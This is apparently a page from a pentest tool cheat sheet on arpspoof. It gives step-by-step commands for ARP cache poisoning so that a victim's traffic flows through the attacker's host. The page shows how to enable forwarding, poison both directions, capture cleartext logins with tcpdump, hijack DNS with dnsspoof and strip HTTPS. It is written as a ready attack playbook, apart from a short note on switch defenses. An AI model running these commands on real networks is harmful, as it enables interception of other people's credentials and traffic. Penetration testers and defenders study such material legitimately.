# arpspoof — classic ARP cache poisoning MITM

> **Part of dsniff suite.** Sends forged ARP replies so a victim sends traffic to you instead of the gateway.

**Install check:** `arpspoof -h` (in `dsniff` package)

---

## 🎯 Cheat-flow

```bash
# Enable IP forwarding on your host FIRST (otherwise victim is blackholed)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Spoof both directions
sudo arpspoof -i eth0 -t <VICTIM_IP> <GATEWAY_IP>     # tell victim we're the GW
sudo arpspoof -i eth0 -t <GATEWAY_IP> <VICTIM_IP>     # tell GW we're the victim
```

Run both in separate shells (or use `-r` for bi-directional on some builds).

Now sniff:
```bash
sudo tcpdump -i eth0 -w mitm.pcap host <VICTIM_IP>
# or
sudo wireshark
```

---

## 🔑 Flags

| Flag | Meaning |
|---|---|
| `-i <iface>` | Interface |
| `-t <target>` | Victim IP (the one we're lying to) |
| `-r` | Poison both directions (some versions) |
| `-c <own/host>` | Cleanup mode — restore original ARP |
| `<host>` (last arg) | IP we're impersonating |

---

## 📋 Recipes

```bash
# 1. Classic sniff a cleartext login
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t 10.0.0.50 10.0.0.1 &
sudo arpspoof -i eth0 -t 10.0.0.1  10.0.0.50 &
sudo tcpdump -i eth0 -A -s 0 'tcp port 80 and host 10.0.0.50'

# 2. Stop and restore ARP tables
# (just Ctrl+C — arpspoof sends gratuitous ARPs on exit to clean up)

# 3. Combine with dnsspoof to hijack domain lookups
sudo dnsspoof -i eth0 -f hosts.txt
```

---

## ⚠️ Gotchas

- **IP forwarding MUST be on** or you DoS the victim instead of MITM-ing them.
- Modern switches with DHCP Snooping + DAI (Dynamic ARP Inspection) drop poisoned replies.
- HTTPS traffic is still encrypted — you need [bettercap](bettercap.md) + sslstrip2 or install a root cert on the victim.
- [bettercap](bettercap.md) / [ettercap](ettercap.md) are easier and include post-MITM modules.
- When you Ctrl+C, arpspoof sends corrective ARPs for a few seconds — let it finish.

---

## 🔗 Related

- [dnsspoof](dnsspoof.md) · [ettercap](ettercap.md) · [bettercap](bettercap.md) · [wireshark](wireshark.md) · [tcpdump](tcpdump.md)
